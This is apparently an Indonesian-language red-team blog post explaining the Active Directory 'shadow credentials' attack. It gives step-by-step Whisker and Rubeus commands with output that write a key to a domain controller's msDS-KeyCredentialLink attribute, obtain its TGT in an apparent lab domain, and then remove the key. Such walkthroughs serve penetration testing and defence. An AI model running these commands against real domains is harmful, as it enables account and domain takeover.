---
title: '[Kerberos] Shadow Credentials'
date: 2023-08-01 23:59:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos]     # TAG names should always be lowercase
author: nairpaa
---


*Whilst Kerberos pre-authentication* biasanya dilakukan dengan menggunakan kunci simetris yang berasal dari password klien, kunci asimetris juga dapat dilakukan melalui *Public Key Cryptography for Initial Authentication* (PKINIT).  

Jika *PKI solution* sudah tersedia, seperti [Active Directory Certificate Services](/posts/intro-to-ad-cs/), Domain Controller dan anggotanya bertukar kunci publik (*public key*) melalui *Certificate Authority* yang sesuai. Ini disebut model *Certificate Trust*.

Ada juga model *Key Trust*, di mana kepercayaan dibangun berdasarkan data kunci raw, bukan sertifikat.  

Hal ini mengharuskan klien untuk menyimpan kunci mereka pada objek domain mereka sendiri, dalam sebuah atribut yang disebut `msDS-KeyCredentialLink`.  

Dasar dari serangan "**shadow credentials**" adalah jika kita dapat menulis ke atribut ini pada objek pengguna atau komputer, kita dapat memperoleh TGT untuk prinsipal tersebut.  

Dengan demikian, ini merupakan penyalahgunaan gaya DACL seperti halnya [RBCD](/posts/resource-based-constrained-delegation/).

Bersamaan dengan [atrikel](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) yang luar biasa tentang masalah ini, [Elad Shamir](https://twitter.com/elad_shamir) mempublikasikan alat yang disebut [Whisker](https://github.com/eladshamir/Whisker), yang membuat eksploitasi ini menjadi sangat mudah.  

## 0x1 - Exploitation Stages

### Step 1: List Any keys that Might Already be Present for a Target

```powershell
PS > .\Whisker.exe list /target:dc-2$

[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=example,DC=io
[*] Listing deviced for dc-2$:
[*] No entries!
```

### Step 2: Add a New Key Pair to the Target.

```powershell
PS > .\Whisker.exe add /target:dc-2$

[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password y52EhYqlfgnYPuRb
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=example,DC=io
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```

### Step 3: ASK for a TGT that Whisker Provides

```powershell
PS > .\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: CN=dc-2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.example.io\dc-2$'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIGaj [...snip...] MuaW8=

  ServiceName              :  krbtgt/dev.example.io
  ServiceRealm             :  DEV.EXAMPLE.IO
  UserName                 :  dc-2$
  UserRealm                :  DEV.EXAMPLE.IO
  StartTime                :  1/21/2023 7:12:27 PM
  EndTime                  :  1/22/2023 5:12:27 AM
  RenewTill                :  1/28/2023 7:12:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  bKJ76Br5CFOL6zckBpl9IA==
  ASREP (key)              :  B0AA392AE0C969E268DAC4462D76FC90
```

## 0x2 - Restoring the Configuration


```powershell
PS > .\Whisker.exe list /target:dc-2$
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=example,DC=io
[*] Listing deviced for dc-2$:
    DeviceID: 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403 | Creation Time: 1/21/2023 7:19:04 PM

PS > .\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
[*] Searching for the target account
[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=example,DC=io
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Found value to remove
[+] Updated the msDS-KeyCredentialLink attribute of the target object
```

---

## 0x3 - References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
- https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
- https://pentestlab.blog/2022/02/07/shadow-credentials/